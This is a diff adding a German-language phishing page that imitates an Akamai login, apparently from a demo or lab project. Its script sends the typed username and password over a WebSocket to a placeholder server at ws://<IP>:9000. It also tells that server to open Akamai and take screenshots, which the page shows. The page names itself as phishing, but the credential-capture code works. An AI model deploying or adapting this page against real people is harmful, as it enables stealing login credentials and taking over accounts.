@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8">
+  <title>Phishing</title>
+</head>
+<body>
+  <h1>Definitiv keine Phishing Seite</h1>
+  <h2>Akamai</h2>
+
+  <div id="login">
+    <label for="userInput">Username: <br><input type="text" id="userInput" placeholder="User eingeben..." /></label><br>
+    <label for="pwInput">Passwort: <br><input type="password" id="pwInput" /></label><br>
+    <button id="loginBtn">Login</button>
+  </div>
+
+
+  <div id="result" hidden="hidden">
+    <img id="grafik" width="1000">
+  </div>
+
+  <p>
+    <button id="sendScreenyBtn">Create Screenshot</button><br>
+    <img id="screeny" width="1000">
+  </p>
+
+  <pre id="output"></pre>
+
+  <script>
+    const socket = new WebSocket('ws://<IP>:9000');
+    const output = document.getElementById('output');
+    const userInput = document.getElementById('userInput');
+    const pwInput = document.getElementById('pwInput');
+    const loginButton = document.getElementById('loginBtn');
+    const sendScreenyButton = document.getElementById('sendScreenyBtn');
+
+
+    socket.addEventListener('open', () => {
+      output.textContent += 'Verbindung zum Server hergestellt.\n';
+      socket.send("akamai");
+      socket.send('goto akamai');
+    });
+
+
+    socket.addEventListener('message', (event) => {
+      const data = event.data;
+      output.textContent += 'Antwort vom Server:\n' + data + '\n';
+      if(data.includes('Image')) {
+         document.getElementById('grafik').setAttribute("src","grafik.png");
+      }
+      if(data.includes("Screenyshot")){
+         const screenyf = document.getElementById('screeny').getAttribute("src") + '?t=reload';
+         document.getElementById('screeny').setAttribute("src",screenyf);
+      }
+
+    });
+
+    socket.addEventListener('close', () => {
+      output.textContent += 'Verbindung geschlossen.\n';
+    });
+
+    socket.addEventListener('error', (error) => {
+      output.textContent += 'Fehler: ' + error + '\n';
+    });
+
+    loginButton.addEventListener('click', () => {
+      const message = userInput.value.trim();
+      if (message && socket.readyState === WebSocket.OPEN) {
+        socket.send( 'user ' + message);
+        output.textContent += 'User Gesendet: ' + message + '\n';
+      } else if (!message) {
+        output.textContent += 'Bitte einen Usernamen eingeben.\n';
+      } else {
+        output.textContent += 'WebSocket ist nicht verbunden.\n';
+      }
+      const pwmessage = pwInput.value.trim();
+      if (pwmessage && socket.readyState === WebSocket.OPEN) {
+        socket.send( 'pw ' + pwmessage);
+        output.textContent += 'Passwort Gesendet '  + '\n';
+        document.getElementById('login').setAttribute("hidden","hidden");
+      } else if (!message) {
+        output.textContent += 'Bitte ein Passwort eingeben.\n';
+      } else {
+        output.textContent += 'WebSocket ist nicht verbunden.\n';
+      }
+    });
+
+
+
+    sendScreenyButton.addEventListener('click', () => {
+      if (socket.readyState === WebSocket.OPEN) {
+
+        const now = new Date();
+        const date = now.toLocaleDateString('de-DE');
+        const time = now.toLocaleTimeString('de-DE');
+        const screenfile =  date + time + '.png';
+        socket.send( 'screenshot ' + screenfile);
+        output.textContent += 'Make Screenshot ' + screenfile  + '\n';
+        document.getElementById('screeny').setAttribute("src","screenshots/" + screenfile);
+
+      } else {
+        output.textContent += 'WebSocket ist nicht verbunden.\n';
+      }
+    });
+
+  </script>
+</body>
+</html>
